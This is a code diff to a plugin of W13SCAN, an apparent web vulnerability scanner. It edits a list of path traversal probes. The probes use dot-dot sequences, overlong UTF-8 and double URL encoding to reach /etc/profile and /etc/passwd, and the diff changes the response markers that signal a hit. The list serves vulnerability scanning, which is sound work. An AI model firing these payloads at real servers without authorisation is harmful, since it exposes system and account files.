@@ -25,9 +25,9 @@ class W13SCAN(PluginBase):
                     {'path': '//././././././././././././././././././././././././../../../../../../../../etc/profile',
                      'tag': '/etc/profile.d/*.sh', 'content-type': '', 'content-type_no': ''}, {
                         'path': '/aa/../../cc/../../bb/../../dd/../../aa/../../cc/../../bb/../../dd/../../bb/../../dd/../../bb/../../dd/../../bb/../../dd/../../ee/../../etc/profile',
-                        'tag': '/etc/profile.d/*.sh', 'content-type': '', 'content-type_no': ''}, {
+                        'tag': '/bin/bash', 'content-type': '', 'content-type_no': ''}, {
                         'path': '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/profile',
-                        'tag': '/etc/profile.d/*.sh', 'content-type': '', 'content-type_no': ''},
+                        'tag': '/bin/bash', 'content-type': '', 'content-type_no': ''},
                     {'path': '/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', 'tag': 'root:x:',
                      'content-type': '', 'content-type_no': ''},
                     {'path': '/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd',
